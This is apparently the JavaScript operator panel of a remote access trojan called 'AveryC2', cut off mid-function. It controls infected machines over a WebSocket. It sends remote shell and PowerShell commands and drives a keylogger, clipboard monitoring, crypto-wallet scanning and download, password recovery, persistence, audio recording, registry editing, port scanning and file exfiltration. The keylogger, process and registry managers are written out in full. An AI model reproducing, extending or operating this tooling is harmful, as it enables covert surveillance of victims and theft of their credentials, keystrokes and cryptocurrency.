        class AveryC2 {
            constructor() {
                this.ws = null;
                this.selectedClient = null;
                this.clients = new Map();
                this.rdpActive = false;
                this.rdpInterval = null;
                this.fpsCounter = 0;
                this.lastFpsUpdate = Date.now();
                this.selectedFile = null;
                this.uploadedFileName = null;
                // File Manager - improved download handling
                this.currentPath = 'C:\\';
                this.selectedFmFile = null;
                this.fileList = [];
                this.downloadChunks = new Map(); // Use Map for better chunk management
                this.downloadFileName = '';
                this.downloadTotalChunks = 0;
                this.downloadExpectedSize = 0;
                this.init();
            }
            
            init() {
                this.connectWebSocket();
                this.setupEventListeners();
            }
            
            connectWebSocket() {
                const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
                this.ws = new WebSocket(`${protocol}//${window.location.host}/ws`);
                
                this.ws.onopen = () => {
                    this.updateStatus('CONNECTED', true);
                    this.addTerminalOutput('>>> KONEK TO SERVER', 'system');
                };
                
                this.ws.onclose = () => {
                    this.updateStatus('DISCONNECTED', false);
                    this.addTerminalOutput('>>> KONEKSI LOST - RETRYING...', 'error');
                    setTimeout(() => this.connectWebSocket(), 3000);
                };
                
                this.ws.onmessage = (event) => {
                    const data = JSON.parse(event.data);
                    this.handleMessage(data);
                };
                
                this.ws.onerror = (error) => {
                    console.error('WebSocket error:', error);
                    this.addTerminalOutput('>>> WEBSOCKET ERROR', 'error');
                };
            }
            
            handleMessage(data) {
                switch (data.type) {
                    case 'clients_list':
                    case 'clients_update':
                        this.updateClientsList(data.clients);
                        break;
                    case 'command_response':
                        this.handleCommandResponse(data);
                        break;
                    case 'command_sent':
                        if (!data.success) {
                            this.addTerminalOutput(`>>> ERROR: ${data.data}`, 'error');
                        }
                        break;

                        case 'wallet_scan_started':
    this.handleWalletScanStarted();
    break;
case 'wallet_found':
    this.handleWalletFound(data);
    break;
case 'wallet_scan_complete':
    this.handleWalletScanComplete(data);
    break;
case 'wallet_download_start':
    this.handleWalletDownloadStart(data);
    break;
case 'wallet_download_chunk':
    this.handleWalletDownloadChunk(data);
    break;
case 'wallet_download_complete':
    this.handleWalletDownloadComplete(data);
    break;
case 'troll_response':
    this.handleTrollResponse(data);
    break;
case 'sysinfo_response':
    this.handleSysInfoResponse(data);
    break;
case 'script_response':
    this.handleScriptResponse(data);
    break;
case 'password_recovery_complete':
    this.handlePasswordRecoveryComplete(data);
    break;


                        case 'persistence_status':
    this.handlePersistenceStatus(data);
    break;
case 'persistence_result':
    this.handlePersistenceResult(data);
    break;

case 'audio_devices':
    this.handleAudioDevices(data);
    break;
case 'audio_record_started':
    this.handleAudioRecordStarted(data);
    break;
case 'audio_record_progress':
    this.handleAudioRecordProgress(data);
    break;
case 'audio_record_error':
    this.handleAudioRecordError(data);
    break;
case 'audio_file_start':
    this.handleAudioFileStart(data);
    break;
case 'audio_file_chunk':
    this.handleAudioFileChunk(data);
    break;
case 'audio_record_complete':
    this.handleAudioRecordComplete(data);
    break;

case 'connections_list':
    this.handleConnectionsList(data);
    break;
case 'connection_close_result':
    this.handleConnectionCloseResult(data);
    break;
case 'netstat_monitor_status':
    // Auto refresh handled
    break;
case 'port_scan_started':
    this.handlePortScanStarted(data);
    break;
case 'port_scan_progress':
    this.handlePortScanProgress(data);
    break;
case 'port_found':
    this.handlePortFound(data);
    break;
case 'port_scan_complete':
    this.handlePortScanComplete(data);
    break;

                        case 'registry_keys_list':
    this.handleRegistryKeysList(data);
    break;
case 'registry_values_list':
    this.handleRegistryValuesList(data);
    break;
case 'registry_read_result':
    this.handleRegistryReadResult(data);
    break;
case 'registry_write_result':
    this.handleRegistryWriteResult(data);
    break;
case 'registry_delete_result':
    this.handleRegistryDeleteResult(data);
    break;
case 'registry_error':
    this.handleRegistryError(data);
    break;
                        case 'keylogger_status':
    this.handleKeyloggerStatus(data);
    break;
case 'keylog_data':
    this.handleKeylogData(data);
    break;
case 'keylog_update':
    this.handleKeylogUpdate(data);
    break;
case 'keylog_clear':
    this.handleKeylogClear(data);
    break;
case 'clipboard_data':
    this.handleClipboardData(data);
    break;
case 'clipboard_set_result':
    this.handleClipboardSetResult(data);
    break;
case 'clipboard_monitor_status':
    // Monitor status handled by toggle function
    break;
case 'clipboard_changed':
    this.handleClipboardChanged(data);
    break;

                        case 'processes_list':
    this.handleProcessesList(data);
    break;
case 'process_kill_result':
    this.handleProcessKillResult(data);
    break;
case 'process_start_result':
    this.handleProcessStartResult(data);
    break;
case 'process_priority_result':
    this.handleProcessPriorityResult(data);
    break;
case 'process_details':
    this.handleProcessDetails(data);
    break;
                    case 'screenshot':
                        this.updateScreenshot(data);
                        break;
                    case 'file_chunk_ack':
                        this.handleFileChunkAck(data);
                        break;
                    case 'file_upload_complete':
                        this.handleFileUploadComplete(data);
                        break;
                    case 'execute_response':
                        this.handleExecuteResponse(data);
                        break;
                    case 'fm_drives':
                        this.handleFmDrives(data);
                        break;
                    case 'fm_files':
                        this.handleFmFiles(data);
                        break;
                    case 'fm_operation_result':
                        this.handleFmOperationResult(data);
                        break;
                    case 'fm_download_start':
                        this.handleFmDownloadStart(data);
                        break;
                    case 'fm_download_chunk':
                        this.handleFmDownloadChunk(data);
                        break;
                    case 'fm_download_complete':
                        this.handleFmDownloadComplete(data);
                        break;
                    case 'fm_search_result':
                        this.handleFmSearchResult(data);
                        break;
                    case 'fm_search_complete':
                        this.handleFmSearchComplete(data);
                        break;
                }
            }
            
            updateClientsList(clients) {
                const clientsList = document.getElementById('clientsList');
                document.getElementById('clientCount').textContent = clients.length;
                
                if (clients.length === 0) {
                    clientsList.innerHTML = '<div class="no-clients">NO ACTIVE CLIENTS</div>';
                    this.clients.clear();
                    return;
                }
                
                // Clear and rebuild list
                clientsList.innerHTML = '';
                
                clients.forEach(client => {
                    const connectedTime = new Date(client.connected_at).toLocaleTimeString();
                    const hostname = client.hostname || 'Unknown';
                    const os = client.os || 'Unknown';
                    
                    const clientElement = document.createElement('div');
                    clientElement.className = 'client-item';
                    clientElement.dataset.clientId = client.id;
                    clientElement.innerHTML = `
                        <div class="client-id">
                            <span class="client-status"></span>${client.id}
                        </div>
                        <div class="client-info">
                            📍 ${client.remote_addr}<br>
                            💻 ${hostname} | ${os}<br>
                            ⏰ ${connectedTime}
                        </div>
                    `;
                    
                    clientElement.addEventListener('click', () => {
                        this.selectClient(client.id);
                    });
                    
                    clientsList.appendChild(clientElement);
                    this.clients.set(client.id, client);
                });
            }
            
            selectClient(clientId) {
                // Remove previous selection
                document.querySelectorAll('.client-item.selected').forEach(item => {
                    item.classList.remove('selected');
                });
                
                // Select new client
                const clientElement = document.querySelector(`[data-client-id="${clientId}"]`);
                if (clientElement) {
                    clientElement.classList.add('selected');
                    this.selectedClient = clientId;
                    
                    document.getElementById('commandInput').disabled = false;
                    document.getElementById('sendBtn').disabled = false;
                    
                    this.addTerminalOutput(`>>> CLIENT SELECTED: ${clientId}`, 'system');
                }
            }
            
            sendCommand() {
                const commandInput = document.getElementById('commandInput');
                const shellType = document.getElementById('shellType').value;
                const command = commandInput.value.trim();
                
                if (!this.selectedClient) return;
                
                // Handle remote desktop selection
                if (shellType === 'remote-desktop') {
                    this.openRemoteDesktop();
                    return;
                }
                
                // Handle remote execute selection
                if (shellType === 'remote-execute') {
                    this.openRemoteExecute();
                    return;
                }
                
                // Handle file manager selection
                if (shellType === 'file-manager') {
                    this.openFileManager();
                    return;
                }

                if (shellType === 'process-manager') {
                this.openProcessManager();
                return;
                 }

                 if (shellType === 'clipboard-manager') {
                    this.openClipboardManager();
                    return;
                 }

                if (shellType === 'keylog-manager') {
                    this.openKeylogger();
                    return;
                 }

                
                if (!command) return;
                
                const fullCommand = shellType === 'powershell' ? 
                    `powershell.exe -Command "${command}"` : 
                    command;
                
                this.addTerminalOutput(`${this.selectedClient}@${shellType}:~$ ${command}`, 'command');
                
                const message = {
                    type: 'send_command',
                    client_id: this.selectedClient,
                    command: fullCommand
                };
                
                this.ws.send(JSON.stringify(message));
                commandInput.value = '';
            }
            
            handleCommandResponse(data) {
                const output = data.data || 'No output';
                const status = data.success ? 'success' : 'error';
                this.addTerminalOutput(output, status);
            }
            
            addTerminalOutput(text, type = 'normal') {
                const terminal = document.getElementById('terminal');
                const output = document.createElement('div');
                output.className = 'terminal-output';
                
                const timestamp = new Date().toLocaleTimeString();
                let prefix = '';
                let color = '#00ff00';
                
                switch (type) {
                    case 'system':
                        prefix = '[SYS] ';
                        color = '#00ffff';
                        break;
                    case 'error':
                        prefix = '[ERR] ';
                        color = '#ff0000';
                        break;
                    case 'command':
                        prefix = '[CMD] ';
                        color = '#ffff00';
                        break;
                    case 'success':
                        color = '#00ff00';
                        break;
                }
                
                output.innerHTML = `<span style="color: #666">[${timestamp}]</span> <span style="color: ${color}">${prefix}${text}</span>`;
                terminal.appendChild(output);
                terminal.scrollTop = terminal.scrollHeight;
            }
            
            updateStatus(status, connected) {
                const statusElement = document.getElementById('connectionStatus');
                const statusText = document.getElementById('statusText');
                
                statusElement.className = `connection-status ${connected ? 'connected' : 'disconnected'}`;
                statusText.textContent = status;
            }
            
            setupEventListeners() {
                const commandInput = document.getElementById('commandInput');
                const sendBtn = document.getElementById('sendBtn');
                const shellType = document.getElementById('shellType');
                
                commandInput.addEventListener('keypress', (e) => {
                    if (e.key === 'Enter') {
                        this.sendCommand();
                    }
                });
                
                sendBtn.addEventListener('click', () => {
                    this.sendCommand();
                });
                
                // Handle shell type change
               // Replace the shell type event listener in setupEventListeners() with this:

shellType.addEventListener('change', (e) => {
    if (!this.selectedClient) {
        this.addTerminalOutput('>>> PILIH CLIENT DULU TOD', 'error');
        e.target.value = 'cmd'; // Reset to cmd
        return;
    }
    
    const selectedType = e.target.value;
    
    switch(selectedType) {
        case 'remote-desktop':
            this.openRemoteDesktop();
            break;
        case 'remote-execute':
            this.openRemoteExecute();
            break;
        case 'file-manager':
            this.openFileManager();
            break;
        case 'process-manager':
            this.openProcessManager();
            break;
        case 'clipboard-manager':
            this.openClipboardManager();
            break;


        case 'keylog-manager':
            this.openKeylogger();
        break;
        
            case 'registry-editor':
    this.openRegistryEditor();
    break;

    case 'network-tools':
    this.openNetworkTools();
    break;

    case 'audio-recorder':
    this.openAudioRecorder();
    break;

case 'persistence':
    this.openPersistenceManager();
    break;

case 'wallet-scanner':
    this.openWalletScanner();
    break;
case 'troll-panel':
    this.openTrollPanel();
    break;
case 'system-info':
    this.openSysInfoPanel();
    break;
    case 'script-execution': // This case was missing
            this.openScriptPanel();
            break;
case 'password-recovery':
    this.startPasswordRecovery();
    break;

    }

    
    
    // Reset to cmd after opening modal
    if (selectedType !== 'cmd' && selectedType !== 'powershell') {
        setTimeout(() => {
            e.target.value = 'cmd';
        }, 100);
    }
});
            }





openKeylogger() {
    if (!this.selectedClient) {
        this.addTerminalOutput('>>> No client selected for keylogger', 'error');
        return;
    }
    
    document.getElementById('keyloggerClientId').textContent = this.selectedClient;
    document.getElementById('keyloggerModal').style.display = 'flex';
    
    this.keyloggerActive = false;
    this.keylogData = '';
    
    // Get current keylog
    this.getKeylog();
    
    this.addTerminalOutput(`>>> Opening keylogger for ${this.selectedClient}`, 'system');
}

toggleKeylogger() {
    const btn = document.getElementById('keyloggerStartBtn');
    const statusIndicator = document.querySelector('.status-indicator');
    const statusText = document.getElementById('keyloggerStatusText');
    
    if (this.keyloggerActive) {
        this.ws.send(JSON.stringify({
            type: 'stop_keylogger',
            client_id: this.selectedClient
        }));
        
        btn.textContent = 'START LOGGING';
        btn.classList.remove('active');
        statusIndicator.classList.remove('active');
        statusIndicator.classList.add('inactive');
        statusText.textContent = 'INACTIVE';
    } else {
        this.ws.send(JSON.stringify({
            type: 'start_keylogger',
            client_id: this.selectedClient
        }));
        
        btn.textContent = 'STOP LOGGING';
        btn.classList.add('active');
        statusIndicator.classList.add('active');
        statusIndicator.classList.remove('inactive');
        statusText.textContent = 'ACTIVE';
    }
    
    this.keyloggerActive = !this.keyloggerActive;
}

getKeylog() {
    this.ws.send(JSON.stringify({
        type: 'get_keylog',
        client_id: this.selectedClient
    }));
}

clearKeylog() {
    if (confirm('Clear all captured keystrokes?')) {
        this.ws.send(JSON.stringify({
            type: 'clear_keylog',
            client_id: this.selectedClient
        }));
        
        this.keylogData = '';
        document.getElementById('keylogContent').textContent = 'No keystrokes captured yet...';
        this.updateKeylogStats();
    }
}

exportKeylog() {
    if (!this.keylogData) {
        alert('No keylog data to export');
        return;
    }
    
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    const filename = `keylog_${this.selectedClient}_${timestamp}.txt`;
    
    const blob = new Blob([this.keylogData], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
    
    this.addTerminalOutput(`>>> Keylog exported to ${filename}`, 'success');
}

handleKeyloggerStatus(data) {
    const statusIndicator = document.querySelector('.status-indicator');
    const statusText = document.getElementById('keyloggerStatusText');
    const btn = document.getElementById('keyloggerStartBtn');
    
    if (data.active) {
        this.keyloggerActive = true;
        btn.textContent = 'STOP LOGGING';
        btn.classList.add('active');
        statusIndicator.classList.add('active');
        statusIndicator.classList.remove('inactive');
        statusText.textContent = 'ACTIVE';
    } else {
        this.keyloggerActive = false;
        btn.textContent = 'START LOGGING';
        btn.classList.remove('active');
        statusIndicator.classList.remove('active');
        statusIndicator.classList.add('inactive');
        statusText.textContent = 'INACTIVE';
    }
    
    if (data.message) {
        this.addTerminalOutput(`>>> Keylogger: ${data.message}`, 'system');
    }
}

handleKeylogData(data) {
    this.keylogData = data.data || '';
    this.displayKeylog(this.keylogData);
    this.updateKeylogStats();
}

handleKeylogUpdate(data) {
    // Append new data
    this.keylogData += data.data || '';
    this.displayKeylog(this.keylogData);
    this.updateKeylogStats();
    
    // Update last update time
    document.getElementById('keylogLastUpdate').textContent = new Date().toLocaleTimeString();
}

handleKeylogClear(data) {
    if (data.success) {
        this.keylogData = '';
        document.getElementById('keylogContent').textContent = 'No keystrokes captured yet...';
        this.updateKeylogStats();
        this.addTerminalOutput('>>> Keylog cleared', 'success');
    }
}

displayKeylog(data) {
    const content = document.getElementById('keylogContent');
    
    if (!data || data.length === 0) {
        content.textContent = 'No keystrokes captured yet...';
        return;
    }
    
    // Process and highlight special keys
    let processed = data
        .replace(/\[ENTER\]/g, '<span class="special-key">[ENTER]</span>\n')
        .replace(/\[TAB\]/g, '<span class="special-key">[TAB]</span>')
        .replace(/\[BACKSPACE\]/g, '<span class="special-key">[BS]</span>')
        .replace(/\[ESC\]/g, '<span class="special-key">[ESC]</span>')
        .replace(/\[DEL\]/g, '<span class="special-key">[DEL]</span>')
        .replace(/\[CTRL\]/g, '<span class="special-key">[CTRL]</span>')
        .replace(/\[ALT\]/g, '<span class="special-key">[ALT]</span>')
        .replace(/\[SHIFT\]/g, '<span class="special-key">[SHIFT]</span>')
        .replace(/\[CAPS\]/g, '<span class="special-key">[CAPS]</span>')
        .replace(/\[(F\d+)\]/g, '<span class="special-key">[$1]</span>')
        .replace(/\[(UP|DOWN|LEFT|RIGHT)\]/g, '<span class="special-key">[$1]</span>');
    
    content.innerHTML = processed;
    
    // Scroll to bottom
    content.scrollTop = content.scrollHeight;
}

updateKeylogStats() {
    const data = this.keylogData || '';
    
    // Calculate stats
    const chars = data.length;
    const words = data.split(/\s+/).filter(w => w.length > 0).length;
    const lines = data.split(/\[ENTER\]|\n/).length;
    const bytes = new Blob([data]).size;
    
    // Update display
    document.getElementById('keylogChars').textContent = chars.toLocaleString();
    document.getElementById('keylogWords').textContent = words.toLocaleString();
    document.getElementById('keylogLines').textContent = lines.toLocaleString();
    document.getElementById('keylogSize').textContent = this.formatFileSize(bytes);
}







            openProcessManager() {
    if (!this.selectedClient) {
        this.addTerminalOutput('>>> No client selected for process manager', 'error');
        return;
    }
    
    document.getElementById('processClientId').textContent = this.selectedClient;
    document.getElementById('processModal').style.display = 'flex';
    
    // Load processes
    this.refreshProcesses();
    
    this.addTerminalOutput(`>>> Opening process manager for ${this.selectedClient}`, 'system');
}

refreshProcesses() {
    this.ws.send(JSON.stringify({
        type: 'get_processes',
        client_id: this.selectedClient
    }));
    
    document.getElementById('processList').innerHTML = '<div class="loading">Loading processes...</div>';
}

handleProcessesList(data) {
    const processList = document.getElementById('processList');
    processList.innerHTML = '';
    
    if (!data.processes || data.processes.length === 0) {
        processList.innerHTML = '<div class="loading">No processes found</div>';
        return;
    }
    
    // Store processes for search
    this.processes = data.processes;
    
    // Sort by memory usage
    data.processes.sort((a, b) => b.memory - a.memory);
    
    data.processes.forEach(process => {
        const item = this.createProcessItem(process);
        processList.appendChild(item);
    });
    
    document.getElementById('processCount').textContent = `${data.processes.length} processes`;
}


createProcessItem(process) {
    const item = document.createElement('div');
    item.className = 'process-item';
    item.dataset.pid = process.pid;
    
    item.innerHTML = `
        <div>${process.pid}</div>
        <div title="${process.name}">${process.name}</div>
        <div>${this.formatMemory(process.memory)}</div>
        <div>${process.threads || 0}</div>
    `;
    
    item.addEventListener('click', () => this.selectProcess(process));
    
    return item;
}

formatMemory(kb) {
    if (kb < 1024) return kb + ' KB';
    if (kb < 1024 * 1024) return (kb / 1024).toFixed(1) + ' MB';
    return (kb / 1024 / 1024).toFixed(1) + ' GB';
}

selectProcess(process) {
    // Clear previous selection
    document.querySelectorAll('.process-item.selected').forEach(item => {
        item.classList.remove('selected');
    });
    
    // Select new process
    const item = document.querySelector(`[data-pid="${process.pid}"]`);
    if (item) {
        item.classList.add('selected');
        this.selectedProcess = process;
        
        // Enable action buttons
        document.getElementById('killProcessBtn').disabled = false;
        document.getElementById('processPrioritySelect').disabled = false;
        document.getElementById('processDetailsBtn').disabled = false;
    }
}

searchProcesses(event) {
    const searchTerm = event.target.value.toLowerCase();
    
    if (!searchTerm) {
        this.refreshProcesses();
        return;
    }
    
    const filtered = this.processes.filter(p => 
        p.name.toLowerCase().includes(searchTerm) ||
        p.pid.toString().includes(searchTerm)
    );
    
    const processList = document.getElementById('processList');
    processList.innerHTML = '';
    
    filtered.forEach(process => {
        const item = this.createProcessItem(process);
        processList.appendChild(item);
    });
    
    document.getElementById('processCount').textContent = `${filtered.length} processes (filtered)`;
}

killSelectedProcess() {
    if (!this.selectedProcess) return;
    
    if (confirm(`Kill process ${this.selectedProcess.name} (PID: ${this.selectedProcess.pid})?`)) {
        this.ws.send(JSON.stringify({
            type: 'kill_process',
            client_id: this.selectedClient,
            process_id: this.selectedProcess.pid
        }));
        
        document.getElementById('processStatusText').textContent = `Killing process ${this.selectedProcess.pid}...`;
    }
}

setProcessPriority() {
    const priority = document.getElementById('processPrioritySelect').value;
    if (!priority || !this.selectedProcess) return;
    
    this.ws.send(JSON.stringify({
        type: 'set_process_priority',
        client_id: this.selectedClient,
        process_id: this.selectedProcess.pid,
        priority: priority
    }));
    
    document.getElementById('processStatusText').textContent = `Setting priority to ${priority}...`;
    document.getElementById('processPrioritySelect').value = '';
}

showStartProcessDialog() {
    document.getElementById('startProcessDialog').style.display = 'block';
    document.getElementById('processPathInput').focus();
}

hideStartProcessDialog() {
    document.getElementById('startProcessDialog').style.display = 'none';
    document.getElementById('processPathInput').value = '';
    document.getElementById('processArgsInput').value = '';
}

startNewProcess() {
    const path = document.getElementById('processPathInput').value.trim();
    const args = document.getElementById('processArgsInput').value.trim();
    
    if (!path) {
        alert('Please enter a process path');
        return;
    }
    
    this.ws.send(JSON.stringify({
        type: 'start_process',
        client_id: this.selectedClient,
        process_path: path,
        process_args: args
    }));
    
    this.hideStartProcessDialog();
    document.getElementById('processStatusText').textContent = `Starting ${path}...`;
}

getProcessDetails() {
    if (!this.selectedProcess) return;
    
    this.ws.send(JSON.stringify({
        type: 'get_process_details',
        client_id: this.selectedClient,
        process_id: this.selectedProcess.pid
    }));
}

handleProcessDetails(data) {
    const content = document.getElementById('processDetailsContent');
    content.innerHTML = `
        <div><strong>PID:</strong> ${data.pid}</div>
        <div><strong>Path:</strong> ${data.path || 'Unknown'}</div>
        <div><strong>Start Time:</strong> ${data.start_time || 'Unknown'}</div>
    `;
    
    document.getElementById('processDetailsDialog').style.display = 'block';
}

hideProcessDetails() {
    document.getElementById('processDetailsDialog').style.display = 'none';
}

handleProcessKillResult(data) {
    if (data.success) {
        document.getElementById('processStatusText').textContent = `Process ${data.pid} killed successfully`;
        this.refreshProcesses();
    } else {
        document.getElementById('processStatusText').textContent = `Failed to kill process: ${data.error}`;
    }
}

handleProcessStartResult(data) {
    if (data.success) {
        document.getElementById('processStatusText').textContent = 'Process started successfully';
        this.refreshProcesses();
    } else {
        document.getElementById('processStatusText').textContent = `Failed to start process: ${data.error}`;
    }
}

handleProcessPriorityResult(data) {
    if (data.success) {
        document.getElementById('processStatusText').textContent = 'Priority changed successfully';
    } else {
        document.getElementById('processStatusText').textContent = 'Failed to change priority';
    }
}
            




openRegistryEditor() {
    if (!this.selectedClient) {
        this.addTerminalOutput('>>> No client selected for registry editor', 'error');
        return;
    }
    
    // Check if Windows client
    const client = this.clients.get(this.selectedClient);
    if (client && client.os !== 'Windows') {
        this.addTerminalOutput('>>> Registry editor is only available for Windows clients', 'error');
        return;
    }
    
    document.getElementById('registryClientId').textContent = this.selectedClient;
    document.getElementById('registryModal').style.display = 'flex';
    
    this.currentRegistryPath = '';
    this.selectedRegistryKey = null;
    
    // Load initial keys
    this.navigateRegistry();
    
    this.addTerminalOutput(`>>> Opening registry editor for ${this.selectedClient}`, 'system');
}

navigateRegistry() {
    const hive = document.getElementById('registryHiveSelect').value;
    const path = document.getElementById('registryPathInput').value.trim();
    
    this.currentRegistryPath = path;
    
    // Clear values panel
    document.getElementById('registryValues').innerHTML = '<div class="no-selection">Loading...</div>';
    
    // Get keys
    this.ws.send(JSON.stringify({
        type: 'registry_enum_keys',
        client_id: this.selectedClient,
        registry_hive: hive,
        registry_key: path
    }));
    
    // Get values
    this.ws.send(JSON.stringify({
        type: 'registry_enum_values',
        client_id: this.selectedClient,
        registry_hive: hive,
        registry_key: path
    }));
    
    this.updateRegistryStatus(`Navigating to ${hive}\\${path || 'ROOT'}`);
}

refreshRegistry() {
    this.navigateRegistry();
}

handleRegistryKeysList(data) {
    const keysContainer = document.getElementById('registryKeys');
    keysContainer.innerHTML = '';
    
    if (!data.keys || data.keys.length === 0) {
        keysContainer.innerHTML = '<div class="no-selection">No subkeys found</div>';
        return;
    }
    
    // Add parent directory option if not at root
    if (this.currentRegistryPath) {
        const parentItem = document.createElement('div');
        parentItem.className = 'registry-key-item';
        parentItem.innerHTML = `
            <span class="key-icon">⬆️</span>
            <span>..</span>
        `;
        parentItem.addEventListener('click', () => this.navigateUpRegistry());
        keysContainer.appendChild(parentItem);
    }
    
    // Add all keys
    data.keys.forEach(key => {
        const item = document.createElement('div');
        item.className = 'registry-key-item';
        item.dataset.keyName = key;
        item.innerHTML = `
            <span class="key-icon">📁</span>
            <span>${key}</span>
        `;
        
        item.addEventListener('click', () => this.selectRegistryKey(key));
        item.addEventListener('dblclick', () => this.openRegistryKey(key));
        
        keysContainer.appendChild(item);
    });
}

handleRegistryValuesList(data) {
    const valuesContainer = document.getElementById('registryValues');
    valuesContainer.innerHTML = '';
    
    if (!data.values || data.values.length === 0) {
        valuesContainer.innerHTML = '<div class="no-selection">No values found</div>';
        return;
    }
    
    data.values.forEach(value => {
        const item = document.createElement('div');
        item.className = 'registry-value-item';
        item.innerHTML = `
            <div class="value-name">${value.name || '(Default)'}</div>
            <div class="value-type">${value.type}</div>
            <div class="value-data" title="Click to view/edit">...</div>
        `;
        
        item.addEventListener('click', () => this.getRegistryValue(value.name));
        
        valuesContainer.appendChild(item);
    });
}

selectRegistryKey(key) {
    // Clear previous selection
    document.querySelectorAll('.registry-key-item.selected').forEach(item => {
        item.classList.remove('selected');
    });
    
    // Select new key
    const item = document.querySelector(`[data-key-name="${key}"]`);
    if (item) {
        item.classList.add('selected');
        this.selectedRegistryKey = key;
        document.getElementById('deleteRegBtn').disabled = false;
    }
}

openRegistryKey(key) {
    const currentPath = document.getElementById('registryPathInput').value;
    const newPath = currentPath ? `${currentPath}\\${key}` : key;
    document.getElementById('registryPathInput').value = newPath;
    this.navigateRegistry();
}

navigateUpRegistry() {
    const currentPath = document.getElementById('registryPathInput').value;
    const parts = currentPath.split('\\');
    parts.pop();
    document.getElementById('registryPathInput').value = parts.join('\\');
    this.navigateRegistry();
}

getRegistryValue(valueName) {
    const hive = document.getElementById('registryHiveSelect').value;
    const path = document.getElementById('registryPathInput').value;
    
    this.ws.send(JSON.stringify({
        type: 'registry_read',
        client_id: this.selectedClient,
        registry_hive: hive,
        registry_key: path,
        registry_value: valueName
    }));
}

handleRegistryReadResult(data) {
    if (data.success) {
        // Show in edit dialog
        document.getElementById('regValueName').value = data.value_name || '';
        document.getElementById('regValueType').value = data.value_type;
        document.getElementById('regValueData').value = data.data;
        document.getElementById('addValueDialog').style.display = 'block';
        
        this.updateRegistryStatus(`Read value: ${data.value_name || '(Default)'}`);
    }
}

showAddValueDialog() {
    document.getElementById('regValueName').value = '';
    document.getElementById('regValueType').value = 'REG_SZ';
    document.getElementById('regValueData').value = '';
    document.getElementById('addValueDialog').style.display = 'block';
}

hideAddValueDialog() {
    document.getElementById('addValueDialog').style.display = 'none';
}

saveRegistryValue() {
    const hive = document.getElementById('registryHiveSelect').value;
    const path = document.getElementById('registryPathInput').value;
    const name = document.getElementById('regValueName').value;
    const type = document.getElementById('regValueType').value;
    const data = document.getElementById('regValueData').value;
    
    this.ws.send(JSON.stringify({
        type: 'registry_write',
        client_id: this.selectedClient,
        registry_hive: hive,
        registry_key: path,
        registry_value: name,
        registry_value_type: type,
        registry_data: data
    }));
    
    this.hideAddValueDialog();
    this.updateRegistryStatus(`Writing value: ${name || '(Default)'}`);
}

deleteRegistryItem() {
    const hive = document.getElementById('registryHiveSelect').value;
    const path = document.getElementById('registryPathInput').value;
    
    if (this.selectedRegistryKey) {
        if (confirm(`Delete registry key: ${this.selectedRegistryKey}?`)) {
            const fullPath = path ? `${path}\\${this.selectedRegistryKey}` : this.selectedRegistryKey;
            
            this.ws.send(JSON.stringify({
                type: 'registry_delete',
                client_id: this.selectedClient,
                registry_hive: hive,
                registry_key: fullPath
            }));
            
            this.updateRegistryStatus(`Deleting key: ${this.selectedRegistryKey}`);
        }
    }
}

handleRegistryWriteResult(data) {
    if (data.success) {
        this.updateRegistryStatus('Value written successfully');
        this.navigateRegistry(); // Refresh
    } else {
        this.updateRegistryStatus('Failed to write value');
    }
}

handleRegistryDeleteResult(data) {
    if (data.success) {
        this.updateRegistryStatus('Deleted successfully');
        this.navigateRegistry(); // Refresh
    } else {
        this.updateRegistryStatus('Failed to delete');
    }
}

handleRegistryError(data) {
    this.updateRegistryStatus(`Error: ${data.error}`);
}

updateRegistryStatus(message) {
    document.getElementById('registryStatus').textContent = message;
}


openNetworkTools() {
    if (!this.selectedClient) {
        this.addTerminalOutput('>>> No client selected for network tools', 'error');
        return;
    }
    
    document.getElementById('networkClientId').textContent = this.selectedClient;
    document.getElementById('networkModal').style.display = 'flex';
    
    this.netstatMonitoring = false;
    this.portScanActive = false;
    this.connections = [];
    this.openPorts = [];
    
    // Load initial connections
    this.refreshConnections();
    
    this.addTerminalOutput(`>>> Opening network tools for ${this.selectedClient}`, 'system');
}

switchNetworkTab(tab) {
    // Update tab buttons
    document.querySelectorAll('.network-tab').forEach(btn => {
        btn.classList.remove('active');
    });
    event.target.classList.add('active');
    
    // Show/hide panels
    if (tab === 'connections') {
        document.getElementById('connectionsPanel').style.display = 'flex';
        document.getElementById('scannerPanel').style.display = 'none';
    } else {
        document.getElementById('connectionsPanel').style.display = 'none';
        document.getElementById('scannerPanel').style.display = 'flex';
    }
}

// Connections Tab Methods
refreshConnections() {
    this.ws.send(JSON.stringify({
        type: 'get_connections',
        client_id: this.selectedClient
    }));
    
    document.getElementById('connectionsList').innerHTML = '<div class="loading">Loading connections...</div>';
}

handleConnectionsList(data) {
    const connectionsList = document.getElementById('connectionsList');
    connectionsList.innerHTML = '';
    
    if (!data.connections || data.connections.length === 0) {
        connectionsList.innerHTML = '<div class="no-results">No active connections</div>';
        return;
    }
    
    this.connections = data.connections;
    
    data.connections.forEach(conn => {
        const item = this.createConnectionItem(conn);
        connectionsList.appendChild(item);
    });
    
    document.getElementById('connectionsCount').textContent = `${data.connections.length} connections`;
    document.getElementById('connectionsStatusText').textContent = 'Updated';
}

createConnectionItem(conn) {
    const item = document.createElement('div');
    item.className = 'connection-item';
    item.dataset.pid = conn.pid;
    item.dataset.localPort = conn.local_port;
    
    item.innerHTML = `
        <div class="connection-protocol">${conn.protocol}</div>
        <div>${conn.local_addr}:${conn.local_port}</div>
        <div>${conn.remote_addr}:${conn.remote_port}</div>
        <div class="connection-state">${conn.state}</div>
        <div>${conn.process} (PID: ${conn.pid})</div>
    `;
    
    item.addEventListener('click', () => this.selectConnection(conn));
    
    return item;
}

selectConnection(conn) {
    document.querySelectorAll('.connection-item.selected').forEach(item => {
        item.classList.remove('selected');
    });
    
    const item = document.querySelector(`[data-pid="${conn.pid}"][data-local-port="${conn.local_port}"]`);
    if (item) {
        item.classList.add('selected');
        this.selectedConnection = conn;
        document.getElementById('closeConnectionBtn').disabled = false;
    }
}

filterConnections(event) {
    const filter = event.target.value.toLowerCase();
    
    if (!filter) {
        this.handleConnectionsList({ connections: this.connections });
        return;
    }
    
    const filtered = this.connections.filter(conn => 
        conn.protocol.toLowerCase().includes(filter) ||
        conn.local_addr.includes(filter) ||
        conn.remote_addr.includes(filter) ||
        conn.process.toLowerCase().includes(filter) ||
        conn.state.toLowerCase().includes(filter)
    );
    
    this.handleConnectionsList({ connections: filtered });
}

closeSelectedConnection() {
